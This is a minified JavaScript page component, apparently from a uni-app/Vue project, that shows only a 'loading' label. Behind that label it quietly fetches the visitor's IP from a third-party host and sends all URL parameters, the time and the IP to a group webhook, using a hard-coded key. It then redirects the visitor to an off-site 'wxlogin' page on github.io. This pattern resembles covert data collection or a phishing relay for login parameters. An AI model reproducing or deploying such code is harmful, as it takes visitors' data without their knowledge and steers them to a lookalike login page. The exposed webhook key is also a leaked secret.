import{r as t,c as a,w as e,i as o,o as s,a as n,b as i,t as r,d as c}from"./index-B2Esfk1g.js";const l=((t,a)=>{const e=t.__vccOpts||t;for(const[o,s]of a)e[o]=s;return e})({data:()=>({title:"加载中..."}),onLoad(t){console.log("页面参数:",t);let a=new URLSearchParams(t).toString();this.pushLogToWechatGroup(t);let e=`https://haocaiy881.github.io/wxlogin/#/?${a}`;window.location.href=e},methods:{getLocalIPs:()=>new Promise(((a,e)=>{t({url:"https://qywx.dailyhaoliao.cn/ip",method:"GET",timeout:3e3,success:t=>{var o;200===t.statusCode&&(null==(o=t.data)?void 0:o.ip)?a(t.data.ip):e(new Error("无效响应数据"))},fail:t=>{e(new Error(`网络请求失败: ${t.errMsg||"未知错误"}`))}})})),async pushLogToWechatGroup(a){const e=await this.getLocalIPs();t({url:"https://qywx.dailyhaoliao.cn/weixin/cgi-bin/webhook/send?key=6e67bc52-15d0-4761-9696-28fb67d0e0da",method:"POST",data:{msgtype:"text",text:{content:`页面访问日志：\n参数：${JSON.stringify(a,null,2)}\n时间：${(new Date).toLocaleString()}\nIP：${e}`}},fail:t=>{console.error("推送日志失败:",t)}})}}},[["render",function(t,l,d,h,u,p){const w=c,f=o;return s(),a(f,{class:"content"},{default:e((()=>[n(f,{class:"text-area"},{default:e((()=>[n(w,{class:"title"},{default:e((()=>[i(r(u.title),1)])),_:1})])),_:1})])),_:1})}],["__scopeId","data-v-1ebd9211"]]);export{l as default};
